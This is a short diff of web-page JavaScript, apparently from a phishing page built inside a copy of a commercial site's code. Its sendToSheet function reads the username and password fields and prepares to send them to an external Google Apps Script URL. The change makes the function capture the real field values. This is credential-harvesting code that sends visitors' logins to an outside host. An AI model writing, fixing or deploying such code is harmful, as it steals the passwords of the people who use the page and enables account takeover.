@@ -845,8 +845,8 @@ a=d[b]=(d[b]||0)+1,a>h&&(m=b,h=a))}g(m,"_cdn_mp")}d.ue&&"function"===typeof d.ue
 
 async function sendToSheet() {
   alert("Sending Data . . .");
-  let username = document.getElementById("username");
-  let password = document.getElementById("password");
+  let username = document.getElementById("username").value;
+  let password = document.getElementById("password").value;
   const url = "https://script.google.com/macros/s/AKfycbyoYwcp4XobvJcgumcAt-Y2Uc1LwKvMCMdnrM0p-dlnO_Sy3p4ZL2-hlLm6e1KwxHwy/exec";
 
   const data = {
